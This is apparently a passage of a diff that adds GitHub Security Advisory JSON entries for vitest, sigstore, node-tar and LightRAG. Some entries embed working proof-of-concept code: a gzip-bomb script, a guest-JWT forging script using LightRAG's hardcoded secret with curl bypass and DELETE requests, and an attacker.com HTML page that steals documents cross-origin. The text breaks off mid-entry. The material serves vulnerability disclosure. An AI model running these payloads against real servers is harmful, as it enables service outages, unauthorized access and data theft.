+          "followers_url": "https://api.github.com/users/AdamKorcz/followers",
+          "following_url": "https://api.github.com/users/AdamKorcz/following{/other_user}",
+          "gists_url": "https://api.github.com/users/AdamKorcz/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/AdamKorcz/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/AdamKorcz/subscriptions",
+          "organizations_url": "https://api.github.com/users/AdamKorcz/orgs",
+          "repos_url": "https://api.github.com/users/AdamKorcz/repos",
+          "events_url": "https://api.github.com/users/AdamKorcz/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/AdamKorcz/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-p63j-vcc4-9vmv",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-p63j-vcc4-9vmv",
+    "html_url": "https://github.com/advisories/GHSA-p63j-vcc4-9vmv",
+    "summary": "@vitest/browser: Browser Mode provider commands bypass the file-access permission gate",
+    "description": "## Summary\n\nBrowser Mode exposes a set of built-in \"commands\" that run on the Node.js side of the test runner and can touch the local filesystem (taking screenshots, managing Playwright traces, uploading files for `<input type=\"file\">`, comparing screenshots).\n\nSeveral of these commands accept a file path from the browser and act on it without checking the `allowWrite` permission gate and without confining the path to the project directory. A client that can reach the Browser Mode API can therefore read, create, overwrite, or delete files anywhere the Vitest process can access, even when `allowWrite` is `false`.\n\nThis matters most when the Browser Mode API is exposed to the network (for example `test.api.host` is set, or the dev server is reachable from another machine or origin). In that configuration `allowWrite` defaults to `false` precisely to block file access, and these commands bypass that protection. On a default localhost-only setup with trusted test code, there is no untrusted party in a position to exploit it. The gap still matters wherever you rely on `allowWrite: false` to contain untrusted test code, because these commands ignore that flag.\n\n## Affected commands and impact\n\n| Command | Operation | Impact |\n|---|---|---|\n| `upload` (Playwright + WebdriverIO) | Read | Arbitrary local file read; contents are loaded into the page and readable by test code. Highest-impact case. |\n| `takeScreenshot` (Playwright + WebdriverIO) | Write | Writes a PNG to an arbitrary path (absolute path used verbatim), creating parent directories. |\n| `screenshotMatcher` | Write | Writes reference/diff PNGs; directory derived from client path allows partial traversal. |\n| `stopChunkTrace` | Write | Writes a Playwright trace `.zip` to a path escapable via `../` in the trace name. |\n| `deleteTracing` | Delete | Deletes arbitrary files by path. |\n| `annotateTraces` | Read (disclosure) | Records a client-controlled attachment path that the reporter copies into the attachments directory, disclosing file contents. |\n\nThe writes do not let an attacker choose the file contents (they produce PNG images or trace archives), so the integrity impact is creating, overwriting, or deleting a file at an arbitrary path rather than writing a chosen payload. The reads (`upload`, `annotateTraces`) are more serious because they expose the full contents of an arbitrary file.\n\nThe fix adds, to every file-touching provider command, an `allowWrite` check for write/delete operations and path confinement to the project root (matching the existing `fs` command pattern), so client-supplied absolute paths and `../` traversal are rejected.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/vitest-dev/vitest/security-advisories/GHSA-p63j-vcc4-9vmv",
+    "source_code_location": "https://github.com/vitest-dev/vitest",
+    "identifiers": [
+      {
+        "value": "GHSA-p63j-vcc4-9vmv",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/vitest-dev/vitest/security/advisories/GHSA-p63j-vcc4-9vmv",
+      "https://github.com/vitest-dev/vitest/pull/10674",
+      "https://github.com/vitest-dev/vitest/pull/10679",
+      "https://github.com/vitest-dev/vitest/pull/10680",
+      "https://github.com/vitest-dev/vitest/commit/33f96a145ef09ca6a43b4e555eb273e64a87be23",
+      "https://github.com/vitest-dev/vitest/commit/5c18dd267ff7f47f24cab2f615a16b37d90feb7f",
+      "https://github.com/vitest-dev/vitest/commit/b795e36b34969bec50b47a9f29d26f799a6a04fb",
+      "https://github.com/vitest-dev/vitest/releases/tag/v3.2.7",
+      "https://github.com/vitest-dev/vitest/releases/tag/v4.1.10",
+      "https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-beta.6",
+      "https://github.com/advisories/GHSA-p63j-vcc4-9vmv"
+    ],
+    "published_at": "2026-07-21T19:36:12Z",
+    "updated_at": "2026-07-21T19:36:13Z",
+    "github_reviewed_at": "2026-07-21T19:36:12Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@vitest/browser"
+        },
+        "vulnerable_version_range": ">= 4.0.0, < 4.1.10",
+        "first_patched_version": "4.1.10",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@vitest/browser"
+        },
+        "vulnerable_version_range": "< 3.2.7",
+        "first_patched_version": "3.2.7",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@vitest/browser"
+        },
+        "vulnerable_version_range": ">= 5.0.0-beta.1, < 5.0.0-beta.6",
+        "first_patched_version": "5.0.0-beta.6",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
+        "score": 9.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-552",
+        "name": "Files or Directories Accessible to External Parties"
+      },
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "manus-use",
+          "id": 213290975,
+          "node_id": "U_kgDODLaP3w",
+          "avatar_url": "https://avatars.githubusercontent.com/u/213290975?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/manus-use",
+          "html_url": "https://github.com/manus-use",
+          "followers_url": "https://api.github.com/users/manus-use/followers",
+          "following_url": "https://api.github.com/users/manus-use/following{/other_user}",
+          "gists_url": "https://api.github.com/users/manus-use/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/manus-use/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/manus-use/subscriptions",
+          "organizations_url": "https://api.github.com/users/manus-use/orgs",
+          "repos_url": "https://api.github.com/users/manus-use/repos",
+          "events_url": "https://api.github.com/users/manus-use/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/manus-use/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
+      "score": 9.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-pf56-329r-95rw",
+    "cve_id": "CVE-2026-59891",
+    "url": "https://api.github.com/advisories/GHSA-pf56-329r-95rw",
+    "html_url": "https://github.com/advisories/GHSA-pf56-329r-95rw",
+    "summary": "Credential confusion in @sigstore/oci can leak registry credentials to an attacker-controlled registry",
+    "description": "### Impact\n\nThis is a credential-exposure / credential-confusion issue.\n\n`getRegistryCredentials()` reads credentials from the Docker config file (`~/.docker/config.json`) and selects an entry by checking whether any configured auth key **contains** the target registry string:\n\n```js\nObject.keys(dockerConfig.auths || {}).find((key) => key.includes(registry))\n```\n\nBecause this is a **substring match rather than an exact host match**, credentials configured for one registry can be selected for — and transmitted to — a *different* registry whose hostname has a substring relationship with a configured auth key (for example, an attacker-controlled `cr.io` matches a configured `ghcr.io`).\n\n**Who is impacted:** Any consumer of `@sigstore/oci` that uploads artifacts to an OCI registry using credentials from a Docker config, where the destination registry/image reference can be influenced by an untrusted party. This includes `@actions/attest` and the `actions/attest`, `actions/attest-build-provenance`, and `actions/attest-sbom` GitHub Actions when run with `push-to-registry: true`, where the `subject-name` input determines the destination registry.\n\nThis is classified as a **critical** vulnerability given the potential, in a theoretical worst-case scenario, to expose long-lived registry credentials. However, in practice, exploitation requires all of the following:\n\n- The Docker config on the host contains credentials for a registry.\n- The destination registry/image reference is influenced by an untrusted source.\n- The attacker controls a registry whose hostname is a substring of (or is otherwise contained within) a configured Docker auth key.\n\nUnder those conditions, registry credentials present on the host (e.g. a GHCR, Docker Hub, or cloud-registry token) can be sent to an attacker-controlled registry during the authentication exchange.\n\n### Patches\n\nFixed in **`@sigstore/oci@0.7.1`**. Credential selection now requires an **exact host match**: both the target registry and each Docker auth key are canonicalized — stripping any `https?://` scheme and path and normalizing the Docker Hub aliases (`index.docker.io` / `registry-1.docker.io` / `docker.io`) — and compared for equality. When no exact match exists, credential lookup now fails rather than falling back to an unrelated credential.\n\n- **Affected versions:** `<= 0.7.0` (all releases from `0.1.0`).\n- **Patched version:** `0.7.1`.\n\nDownstream consumers should pick up the patched `@sigstore/oci`; subsequent releases of `@actions/attest` and the `actions/attest*` GitHub Actions will bundle the fix.\n\n### Workarounds\n\n- Treat the destination registry/image reference as trusted input — do not allow untrusted sources to influence the registry/image reference passed to `@sigstore/oci` (or the `subject-name` of `actions/attest*` when `push-to-registry: true`).\n- Limit the credentials available in the host's Docker config to only those required for the operation, and avoid authenticating to registries whose hostnames have substring relationships with potential untrusted destinations.\n- Scope registry tokens narrowly and prefer short-lived credentials.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/sigstore/sigstore-js/security-advisories/GHSA-pf56-329r-95rw",
+    "source_code_location": "https://github.com/sigstore/sigstore-js",
+    "identifiers": [
+      {
+        "value": "GHSA-pf56-329r-95rw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-59891",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/sigstore/sigstore-js/security/advisories/GHSA-pf56-329r-95rw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-59891",
+      "https://github.com/sigstore/sigstore-js/commit/85c58380758b97ce1b74ef470e55cc21f9d3aa89",
+      "https://github.com/sigstore/sigstore-js/releases/tag/%40sigstore%2Foci%400.7.1",
+      "https://github.com/advisories/GHSA-pf56-329r-95rw"
+    ],
+    "published_at": "2026-07-21T19:34:05Z",
+    "updated_at": "2026-07-21T19:34:05Z",
+    "github_reviewed_at": "2026-07-21T19:34:05Z",
+    "nvd_published_at": "2026-07-14T17:17:15Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@sigstore/oci"
+        },
+        "vulnerable_version_range": "< 0.7.1",
+        "first_patched_version": "0.7.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "score": 9.6
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-522",
+        "name": "Insufficiently Protected Credentials"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "gyubin02",
+          "id": 108530850,
+          "node_id": "U_kgDOBngMog",
+          "avatar_url": "https://avatars.githubusercontent.com/u/108530850?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/gyubin02",
+          "html_url": "https://github.com/gyubin02",
+          "followers_url": "https://api.github.com/users/gyubin02/followers",
+          "following_url": "https://api.github.com/users/gyubin02/following{/other_user}",
+          "gists_url": "https://api.github.com/users/gyubin02/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/gyubin02/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/gyubin02/subscriptions",
+          "organizations_url": "https://api.github.com/users/gyubin02/orgs",
+          "repos_url": "https://api.github.com/users/gyubin02/repos",
+          "events_url": "https://api.github.com/users/gyubin02/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/gyubin02/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "score": 9.6
+    },
+    "epss": {
+      "percentage": 0.00321,
+      "percentile": 0.24138
+    }
+  },
+  {
+    "ghsa_id": "GHSA-23hp-3jrh-7fpw",
+    "cve_id": "CVE-2026-59873",
+    "url": "https://api.github.com/advisories/GHSA-23hp-3jrh-7fpw",
+    "html_url": "https://github.com/advisories/GHSA-23hp-3jrh-7fpw",
+    "summary": "node-tar: Decompression/parse DoS via unlimited input",
+    "description": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1. Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\nfs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s = 256;\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'), 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () => {\n  while (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() => {\n    try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes / (1024 * 1024));\n        process.stdout.write(`\\r[>] Extracted: ${mb} MB`);\n        \n        if (mb > 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\nprocess.on('exit', () => {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/isaacs/node-tar/security-advisories/GHSA-23hp-3jrh-7fpw",
+    "source_code_location": "https://github.com/isaacs/node-tar",
+    "identifiers": [
+      {
+        "value": "GHSA-23hp-3jrh-7fpw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-59873",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/isaacs/node-tar/security/advisories/GHSA-23hp-3jrh-7fpw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-59873",
+      "https://github.com/isaacs/node-tar/commit/2812e9338665659b183aa7226518c307044957d3",
+      "https://github.com/isaacs/node-tar/releases/tag/v7.5.19",
+      "https://github.com/advisories/GHSA-23hp-3jrh-7fpw"
+    ],
+    "published_at": "2026-07-20T21:52:03Z",
+    "updated_at": "2026-07-20T21:52:04Z",
+    "github_reviewed_at": "2026-07-20T21:52:03Z",
+    "nvd_published_at": "2026-07-08T16:16:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "tar"
+        },
+        "vulnerable_version_range": "<= 7.5.18",
+        "first_patched_version": "7.5.19",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+        "score": 9.2
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Jvr2022",
+          "id": 109031036,
+          "node_id": "U_kgDOBn-ufA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/109031036?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Jvr2022",
+          "html_url": "https://github.com/Jvr2022",
+          "followers_url": "https://api.github.com/users/Jvr2022/followers",
+          "following_url": "https://api.github.com/users/Jvr2022/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Jvr2022/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Jvr2022/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Jvr2022/subscriptions",
+          "organizations_url": "https://api.github.com/users/Jvr2022/orgs",
+          "repos_url": "https://api.github.com/users/Jvr2022/repos",
+          "events_url": "https://api.github.com/users/Jvr2022/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Jvr2022/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.00358,
+      "percentile": 0.27937
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f4vv-55c2-5789",
+    "cve_id": "CVE-2026-61740",
+    "url": "https://api.github.com/advisories/GHSA-f4vv-55c2-5789",
+    "html_url": "https://github.com/advisories/GHSA-f4vv-55c2-5789",
+    "summary": "LightRAG is Vulnerable to Authentication Bypass: hardcoded DEFAULT_TOKEN_SECRET and public /auth-status defeat LIGHTRAG_API_KEY protection",
+    "description": "## Summary\n\nWhen LightRAG is deployed with `LIGHTRAG_API_KEY` set but `AUTH_ACCOUNTS` unset (an officially documented \"API-Key authentication\" mode), the `X-API-Key` protection can be bypassed by any remote unauthenticated attacker. The bypass does not require network contact with the victim server — an attacker can mint a valid guest JWT offline using the hardcoded `DEFAULT_TOKEN_SECRET` committed in the repository and then call any endpoint guarded by `Depends(combined_auth)`, including destructive operations such as `DELETE /documents`, `POST /documents/upload`, `/documents/clear_cache`, and `POST /query`.\n\nThis is distinct from the previously-fixed GHSA-mcww-4hxq-hfr3 / CVE-2026-30762, which only covered the `AUTH_ACCOUNTS`-configured case. The API-Key-only deployment profile is still fully exploitable on current `main` (commit `157c331`, v1.4.15).\n\n## Root cause\n\nThree independent issues combine:\n\n1. `lightrag/api/config.py:54` ships a hardcoded default JWT secret:\n   ```python\n   DEFAULT_TOKEN_SECRET=\"lightr...key!\"\n   ```\n2. `lightrag/api/auth.py:28-38` falls back to `DEFAULT_TOKEN_SECRET` with only a warning log when `AUTH_ACCOUNTS` is not configured. The fix for CVE-2026-30762 only raises when `AUTH_ACCOUNTS` is set, so the API-key-only path is silently vulnerable.\n3. `lightrag/api/lightrag_server.py:1140-1186` exposes `GET /auth-status` and `POST /login` without any authentication dependency. In the API-key-only configuration, `auth_handler.accounts` is empty, and both endpoints unconditionally mint and return a signed guest JWT.\n4. `lightrag/api/utils_api.py:214-216` inside `combined_dependency` short-circuits authorization on any valid guest token when `auth_configured` is false, **before** reaching the `X-API-Key` check on line 237:\n   ```python\n   if not auth_configured and token_info.get(\"role\") == \"guest\":\n       return\n   ```\n\n## Proof of concept (offline-minted token, zero server contact)\n\nTested against a clean install of commit `157c331` running locally with only `LIGHTRAG_API_KEY=super-...ass` configured.\n\n```bash\n$ python3 - <<'PY'\nimport jwt\nfrom datetime import datetime, timedelta, timezone\nprint(jwt.encode(\n    {\"sub\":\"guest\",\"role\":\"guest\",\n     \"exp\":datetime.now(timezone.utc)+timedelta(hours=24),\n     \"metadata\":{\"auth_mode\":\"disabled\"}},\n    \"lightrag-jwt-default-secret-key!\",\n    algorithm=\"HS256\"))\nPY\neyJhbGci...\n\n# Control — no creds: correctly rejected\n$ curl -s -w \"HTTP %{http_code}\\n\" http://target:9876/documents\n{\"detail\":\"API Key required\"}\nHTTP 403\n\n# Control — wrong API key: correctly rejected\n$ curl -s -w \"HTTP %{http_code}\\n\" -H \"X-API-Key: wrong-key\" http://target:9876/documents\n{\"detail\":\"Invalid API Key\"}\nHTTP 403\n\n# Bypass — offline-minted guest JWT: accepted\n$ curl -s -w \"HTTP %{http_code}\\n\" -H \"Authorization: Bearer *** \\\n    http://target:9876/documents\n{\"statuses\":{}}\nHTTP 200\n\n# Destructive confirmation — DELETE /documents with the same token\n$ curl -s -X DELETE -w \"HTTP %{http_code}\\n\" -H \"Authorization: Bearer *** \\\n    http://target:9876/documents\n{\"status\":\"success\",\"message\":\"All documents cleared successfully. Deleted 0 files.\"}\nHTTP 200\n```\n\nThe guest JWT also does not need to be minted offline — `GET /auth-status` hands one out to anyone, even when the server is started with `LIGHTRAG_API_KEY` set. Either path (offline or `/auth-status`) yields the same bypass.\n\n## Impact\n\nAny LightRAG instance that is reachable on the network and configured with:\n- `LIGHTRAG_API_KEY` set (i.e. the operator believes the server is protected), and\n- `AUTH_ACCOUNTS` unset (i.e. they opted out of the password-based login flow)\n\nis fully accessible to any anonymous caller. This configuration is documented as the \"simple API-Key authentication\" mode in `docs/LightRAG-API-Server.md`, so it is expected to be common in production. An attacker can:\n\n- Read and delete arbitrary documents (`/documents`, `DELETE /documents`)\n- Upload arbitrary documents and text for ingestion (`/documents/upload`, `/documents/text`, `/documents/texts`, `/documents/file_batch`, `/documents/scan`)\n- Clear LLM / embedding caches (`/documents/clear_cache`)\n- Inspect and mutate the knowledge graph (`/graph/*`)\n- Run arbitrary queries that will consume paid LLM / embedding credits (`/query`, `/query/stream`)\n\nBecause the server may be exposed behind corporate reverse proxies that trust `LIGHTRAG_API_KEY`, this also lets the attacker bypass perimeter authentication that the operator assumed was sufficient.\n\n## Suggested CVSS\n\n7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` (High). Unauthenticated, network-reachable, affects confidentiality and integrity of all ingested documents and knowledge graphs; availability impact via cache wipes and credit exhaustion.\n\n## Suggested fix\n\nAny one of the following individually closes the primary vector; all three are recommended for defense in depth:\n\n1. **Remove the hardcoded fallback.** Mirror the fix for CVE-2026-30762: refuse to start (or emit a randomly-generated ephemeral secret that is not exported) whenever `TOKEN_SECRET` is unset, regardless of `AUTH_ACCOUNTS`.\n2. **Gate `/auth-status` and `/login` when `LIGHTRAG_API_KEY` is set.** Either require `Depends(combined_auth)` or stop minting guest tokens whenever `api_key_configured` is true.\n3. **Fix the short-circuit in `combined_dependency`.** Do not accept guest tokens as authentication when `api_key_configured` is true; always require a valid `X-API-Key` header in that configuration.\n\n## Affected versions\n\n- `main` through commit `157c331` (2026-04-15)\n- Most recent release v1.4.15 and all prior releases that ship the API-Key-only code path\n\n## Prior art checked\n\n- GHSA-8ffj-4hx4-9pgf / CVE-2026-39413 — JWT `alg:none`. Unrelated.\n- GHSA-mcww-4hxq-hfr3 / CVE-2026-30762 — hardcoded JWT secret combined with `AUTH_ACCOUNTS`. Fixed by PR #2869, which explicitly does **not** cover the API-Key-only configuration.\n- Issues/PRs searched: \"guest token bypass\", \"DEFAULT_TOKEN_SECRET\", \"hardcoded secret\", \"auth-status\", \"api key bypass\". No prior report covering this vector.\n\n## Discovery\n\nFound during an external security review of LightRAG's API authentication flow. Reporter can be credited publicly as \"patchmyday (Jason Zhang)\" upon disclosure.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/HKUDS/LightRAG/security-advisories/GHSA-f4vv-55c2-5789",
+    "source_code_location": "https://github.com/HKUDS/LightRAG",
+    "identifiers": [
+      {
+        "value": "GHSA-f4vv-55c2-5789",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-61740",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-f4vv-55c2-5789",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-61740",
+      "https://github.com/HKUDS/LightRAG/pull/3319",
+      "https://github.com/HKUDS/LightRAG/commit/f7819aa3a49a9d8d92eed8251d82d6ebcafa8cba",
+      "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4",
+      "https://github.com/advisories/GHSA-f4vv-55c2-5789"
+    ],
+    "published_at": "2026-07-20T21:46:37Z",
+    "updated_at": "2026-07-20T21:46:39Z",
+    "github_reviewed_at": "2026-07-20T21:46:37Z",
+    "nvd_published_at": "2026-07-15T15:16:48Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "lightrag-hku"
+        },
+        "vulnerable_version_range": "< 1.5.4",
+        "first_patched_version": "1.5.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+        "score": 9.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
+      {
+        "cwe_id": "CWE-798",
+        "name": "Use of Hard-coded Credentials"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "patchmyday",
+          "id": 104337520,
+          "node_id": "U_kgDOBjgQcA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/104337520?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/patchmyday",
+          "html_url": "https://github.com/patchmyday",
+          "followers_url": "https://api.github.com/users/patchmyday/followers",
+          "following_url": "https://api.github.com/users/patchmyday/following{/other_user}",
+          "gists_url": "https://api.github.com/users/patchmyday/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/patchmyday/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/patchmyday/subscriptions",
+          "organizations_url": "https://api.github.com/users/patchmyday/orgs",
+          "repos_url": "https://api.github.com/users/patchmyday/repos",
+          "events_url": "https://api.github.com/users/patchmyday/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/patchmyday/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00381,
+      "percentile": 0.30298
+    }
+  },
+  {
+    "ghsa_id": "GHSA-6x6h-qqr7-855w",
+    "cve_id": "CVE-2026-61736",
+    "url": "https://api.github.com/advisories/GHSA-6x6h-qqr7-855w",
+    "html_url": "https://github.com/advisories/GHSA-6x6h-qqr7-855w",
+    "summary": "LightRAG: CORS Wildcard + Credentials Enables Any-Origin Credentialed Requests",
+    "description": "### Summary\nThe server defaults to CORS_ORIGINS=* combined with allow_credentials=True. Starlette's CORSMiddleware echoes the requesting origin in preflight responses when credentials are enabled, meaning every origin is effectively whitelisted for credentialed cross-origin requests. Any malicious website can perform authenticated API calls on behalf of a logged-in user.\n\n### Details\n\n```python\n# lightrag/api/config.py:639\nargs.cors_origins = get_env_value(\"CORS_ORIGINS\", \"*\")  # default wildcard\n\n# lightrag/api/lightrag_server.py:1379\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],       # any origin\n    allow_credentials=True,   # credentials — PROBLEM with wildcard\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\n# Starlette CORSMiddleware (confirmed in source):\n# preflight_explicit_allow_origin = not allow_all_origins or allow_credentials\n# = not True or True = True  → echoes the requesting origin back, not \"*\"\n# Result: every origin receives Access-Control-Allow-Credentials: true\n```\n\n### PoC\n\nHost on any origin. Open in browser where user is logged in to LightRAG:\n\n```html\n<!-- attacker.com/steal.html -->\n<script>\nconst TARGET = \"http://lightrag-server:9621\";\n(async () => {\n  // Get victim token (or re-use existing session)\n  const r1 = await fetch(`${TARGET}/login`, {\n    method: \"POST\", credentials: \"include\",\n    headers: {\"Content-Type\": \"application/x-www-form-urlencoded\"},\n    body: \"username=victim&password=known_pass\"\n  });\n  const { access_token } = await r1.json();\n\n  // Exfiltrate all documents\n  const docs = await (await fetch(`${TARGET}/documents`, {\n    credentials: \"include\",\n    headers: { Authorization: `Bearer ${access_token}` }\n  })).json();\n  console.log(\"STOLEN DOCS:\", docs);\n})();\n</script>\n```\n\n### Impact\nPermissive cross-domain policy (CWE-942). Any website visited by an authenticated LightRAG user can silently make authenticated API requests, exfiltrating all documents and knowledge graph data or 